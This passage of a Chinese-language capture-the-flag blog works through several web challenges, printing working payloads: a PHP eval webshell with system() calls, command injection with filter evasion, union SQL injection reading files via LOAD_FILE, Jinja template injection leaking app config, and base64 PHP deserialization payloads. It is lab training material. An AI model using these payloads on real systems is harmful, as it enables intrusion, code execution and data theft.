  </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);<span class="comment">//返回当前字符</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;<span class="comment">//返回字符串第一个字符的 ASCII 值+1</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//从指定ASCII码中返回字符</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;<span class="comment">//拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取明文，反过来操作就行</p>
<p>如下，得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_o</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$miwen</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_o</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">	<span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$_c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></p>
<h2 id="command-execution-x2F-Cyberpeace-n3k0-2"><a href="#command-execution-x2F-Cyberpeace-n3k0-2" class="headerlink" title="command_execution&#x2F;Cyberpeace-n3k0(2)"></a>command_execution&#x2F;Cyberpeace-n3k0(2)</h2><p>命令注入，用<code>&amp;</code>连接</p>
<p>在&#x2F;home目录下有一个flag.txt，得到flag</p>
<p><img data-src="https://img-blog.csdnimg.cn/c56f875e3657446bba4fc07b013f82ac.png" alt="在这里插入图片描述"></p>
<p><code>cyberpeace&#123;49782780ee64f5453147468a72161f08&#125;</code></p>
<h2 id="webshell-x2F-Cyberpeace-n3k0-2"><a href="#webshell-x2F-Cyberpeace-n3k0-2" class="headerlink" title="webshell&#x2F;Cyberpeace-n3k0(2)"></a>webshell&#x2F;Cyberpeace-n3k0(2)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你会使用webshell吗？</span><br><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>用hackbar传参数shell就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell=system(&quot;ls&quot;);</span><br><span class="line">flag.txt index.php</span><br><span class="line">shell=system(&quot;cat flag.txt&quot;);</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;3bdaaca4709609b1c356b98ba243db0b&#125;</code></p>
<h2 id="xff-referer-x2F-Cyberpeace-n3k0-2"><a href="#xff-referer-x2F-Cyberpeace-n3k0-2" class="headerlink" title="xff_referer&#x2F;Cyberpeace-n3k0(2)"></a>xff_referer&#x2F;Cyberpeace-n3k0(2)</h2><p>提示<code>ip地址必须为123.123.123.123</code>，需要修改<code>X-Forwarded-For</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址，但是这个IP却未必是真实的</span><br><span class="line">X-Forwarded-For: client1, proxy1, proxy2</span><br><span class="line">第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个</span><br></pre></td></tr></table></figure>

<p>提示<code>必须来自https://www.google.com</code>，需要修改Referer</p>
<p>得到flag</p>
<p><code>cyberpeace&#123;edf5ae233479849e3d4896efda7155bd&#125;</code></p>
<h2 id="upload1-2"><a href="#upload1-2" class="headerlink" title="upload1(2)"></a>upload1(2)</h2><p>把如下php文件后缀改成png，然后在上传的时候bp抓包把文件名改回成php</p>
<p>用御剑连接后，在上一级目录下有<code>flag.php</code>，打开就能得到flag</p>
<p><code>cyberpeace&#123;9d2d0b1dcdaa91db15aa5b668a95e7bd&#125;</code></p>
<h2 id="very-easy-sql-x2F-CTF-3"><a href="#very-easy-sql-x2F-CTF-3" class="headerlink" title="very_easy_sql&#x2F;CTF(3)"></a>very_easy_sql&#x2F;CTF(3)</h2><p>这一题和之前<a href="#very-easy-sql-x2F-CTF-1">标星号</a>的一样</p>
<h2 id="favorite-number-3"><a href="#favorite-number-3" class="headerlink" title="favorite_number(3)"></a>favorite_number(3)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致的思路是stuff用某个漏洞传一个数组，num用&amp;传一个命令注入</p>
<p>提示了php5.5.9，说明存在漏洞，查了一下，是整数溢出漏洞</p>
<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">PHP :: Bug #69892 :: Different arrays compare indentical due to integer key truncation</a></p>
<p>即，当数组为九位16机制数时，会溢出，等同于重新排序，16的8次方即4294967296在逻辑上等同于下标0；</p>
<p>所以需要传<code>stuff[4294967296]=admin&amp;stuff[1]=user</code></p>
<p>正则表达式<code>/^\d+$/im</code>的含义是</p>
<p><code>^ $</code>：边界符</p>
<p><code>\d+</code>：一个或多个数字</p>
<p><code>i</code>：不区分大小写</p>
<p><code>m</code>：多行匹配</p>
<p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。</p>
<p>所以当启动多行匹配时，第二行会导致命令执行，而<code>%0a</code>就相当于<code>;</code></p>
<p>传<code>num=1%0als /</code></p>
<p>这里用hackbar好像不行，需要用bp抓hackbar的包，看了一下，缺少的是Referer字段</p>
<p>在<code>/</code>目录下就有flag文件</p>
<p>但是这里把cat、echo、flag都ban了</p>
<p>可以用这些查看</p>
<p><img data-src="https://img2020.cnblogs.com/blog/2556426/202112/2556426-20211211222605581-737618577.png" alt="img"></p>
<p>而文件名被ban的情况下，可以用inode索引号来匹配文件，使用<code>ls -i</code>可以看到inode号</p>
<p><code>18497049 flag</code></p>
<p>使用下列命令查看flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tac `find / -inum 18497049`</span><br><span class="line">这里用的是反引号，表示命令替换，命令替换是指Shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出</span><br></pre></td></tr></table></figure>

<p>但是结果504了？</p>
<p>尝试其它方法</p>
<p>用printf将命令写入一个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf /fla &gt; /tmp/hello</span><br><span class="line">printf g &gt;&gt; /tmp/hello</span><br><span class="line">tac `tac /tmp/hello`</span><br><span class="line"></span><br><span class="line"># printf /fla &gt; /tmp/hello %26%26 printf g &gt;&gt; /tmp/hello %26%26 tac `tac /tmp/hello`</span><br></pre></td></tr></table></figure>

<p>可以得到flag</p>
<p>还有一个方法使用全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=/fla;b=g;tac $a$b</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;e59c6f6c33936dec616de49d44d8d3f2&#125;</code></p>
<h2 id="fakebook-x2F-网鼎杯2018-3"><a href="#fakebook-x2F-网鼎杯2018-3" class="headerlink" title="fakebook&#x2F;网鼎杯2018(3)"></a>fakebook&#x2F;网鼎杯2018(3)</h2><p>不太会，看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62063669/article/details/125404398">大佬的WP</a></p>
<p>先查看robots.txt，可以看到有<code>/user.php.bak</code>，访问并下载文件</p>
<p>可以看到判断合法blog的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function isValidBlog ()</span><br><span class="line">&#123;</span><br><span class="line">    $blog = $this-&gt;blog;</span><br><span class="line">    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要blog字段满足http(s):&#x2F;&#x2F;(数字&#x2F;字母一个以上).(字母2-6个):(数字一个以上)或者(非空字符0次以上)，忽略大小写</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com</span><br></pre></td></tr></table></figure>

<p>成功添加</p>
<p><img data-src="/../images/WRITEUP/image-20220916102952876.png" alt="image-20220916102952876"></p>
<p>点击链接可以看到url中<code>?no=1</code></p>
<p>猜测存在sql注入，输入<code>&#39;</code>报错</p>
<p>用sqlmap注一下，没有结果，只能手工注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 5报错，说明有4个字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4显示no hack ~_~</span><br><span class="line">尝试绕过，用/**/</span><br><span class="line">?no=-1/**/union/**/select/**/1,database(),3,4--+</span><br><span class="line">发现字段2是注入点，显示数据库名fakebook</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916111128542.png" alt="image-20220916111128542"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27;</span><br><span class="line">表名users</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916141845150.png" alt="image-20220916141845150"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#x27;fakebook&#x27;</span><br><span class="line">列名：no,username,passwd,data</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916142609446.png" alt="image-20220916142609446"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,group_concat(username,passwd),3,4 from users</span><br><span class="line">这里username\passwd就是之前操作生成的</span><br><span class="line">?no=-1/**/union/**/select/**/1,group_concat(data),3,4 from users</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;ad&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:12:&quot;http://1.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916145142826.png" alt="image-20220916145142826"></p>
<p>这里用dirsearch扫描可以看到flag.php，且和view.php在同一目录下。</p>
<p><img data-src="/../images/WRITEUP/image-20220916143348493.png" alt="image-20220916143348493"></p>
<p>这里有两种方法查看flag.php文件</p>
<p>1.用<code>file:///</code>协议来读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;ad&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查看源码，可以看到iframe标签里有base64加密的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220916145656766.png" alt="image-20220916145656766"></p>
<p>解密后可以得到flag（可以在控制台使用atob()函数解密，btoa加密）</p>
<p><img data-src="/../images/WRITEUP/image-20220916145719137.png" alt="image-20220916145719137"></p>
<p><img data-src="/../images/WRITEUP/image-20220916150027334.png" alt="image-20220916150027334"></p>
<p>2.sql语句中LOAD_FILE()函数可以读取一个文件并将其内容作为字符串返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union /**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>

<p>flag在源码中</p>
<p><img data-src="/../images/WRITEUP/image-20220916143115357.png" alt="image-20220916143115357"></p>
<p><code>flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;</code></p>
<h2 id="shrine-x2F-CTF-3"><a href="#shrine-x2F-CTF-3" class="headerlink" title="shrine&#x2F;CTF(3)"></a>shrine&#x2F;CTF(3)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><code>/shrine/</code>这个路径存在模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:51191/shrine/&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919103910033.png" alt="image-20220919103910033"></p>
<p>这里把config过滤了，但是可以用url_for或者get_flashed_messages读取全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919104610404.png" alt="image-20220919104610404"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20220919104700241.png" alt="image-20220919104700241"></p>
<p><code>flag&#123;shrine_is_good_ssti&#125;</code></p>
<h2 id="unseping-x2F-江苏工匠杯-1"><a href="#unseping-x2F-江苏工匠杯-1" class="headerlink" title="unseping&#x2F;江苏工匠杯(1)"></a>unseping&#x2F;江苏工匠杯(1)</h2><p><a target="_blank" rel="noopener" href="https://www.pudn.com/news/634a7fc12aaf6043c92a4a0a.html">参考</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) <span class="comment">//过滤了 | &amp; ; space /</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致流程是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传参-&gt;反序列化-&gt;construct()-&gt;wakeup()填充args-&gt;destruct()赋method值ping-&gt;ping()</span><br></pre></td></tr></table></figure>

<p>所以要传的参数<code>CTF</code>需要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag=&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看文件的方法</p>
<p><img data-src="/../images/WRITEUP/image-20221025104923960.png" alt="image-20221025104923960"></p>
<p>文件名替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用inode索引号来匹配文件，使用`ls -i`可以看到inode号</span><br><span class="line">tac `find / -inum 18497049`</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用全局遍历</span><br><span class="line">a=/fla;b=g;tac $a$b</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Michael177/article/details/124639138">linux默认环境变量</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls被ban：可以用空的环境变量绕过，例如`l&#123;z&#125;s`</span><br><span class="line">$&#123;IFS&#125;默认指定space,tab,换行</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img data-src="/../images/WRITEUP/image-20221025113050809.png" alt="image-20221025113050809"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNDoibCR7en1zJHtJRlN9LWwiO319</code></p>
<p>用POST方法传base64编码后的结果</p>
<p><img data-src="/../images/WRITEUP/image-20221025112957162.png" alt="image-20221025112957162"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中第一列d代表目录，l代表连接文件,b代表设备文件</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221025113304312.png" alt="image-20221025113304312"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyODoibCR7en1zJHtJRlN9ZmxhJHt6fWdfMXNfaGVyZSI7fX0=</code></p>
<p><img data-src="/../images/WRITEUP/image-20221025112537059.png" alt="image-20221025112537059"></p>
<p>但是这里<code>/</code>和<code>;</code>都被过滤了，该如何读取php内容？</p>
<p>可以使用8进制ascii码替换命令，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls-&gt;$(printf &quot;\154\163&quot;)</span><br></pre></td></tr></table></figure>

